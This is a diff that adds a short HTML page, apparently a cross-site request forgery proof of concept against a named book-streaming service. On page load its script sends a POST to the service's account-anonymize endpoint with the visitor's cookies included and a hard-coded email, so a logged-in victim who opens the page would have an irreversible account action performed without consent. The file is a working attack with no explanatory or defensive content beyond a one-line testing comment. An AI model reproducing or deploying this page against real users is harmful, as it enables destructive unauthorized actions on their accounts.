@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://api.bookbeat.com/api/my/account/anonymize", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: "sukunatest90@gmail.com"  // replace with your own email if testing
+        }),
+        credentials: "include" // sends cookies (e.g., session token)
+      });
+    </script>
+  </body>
+</html>
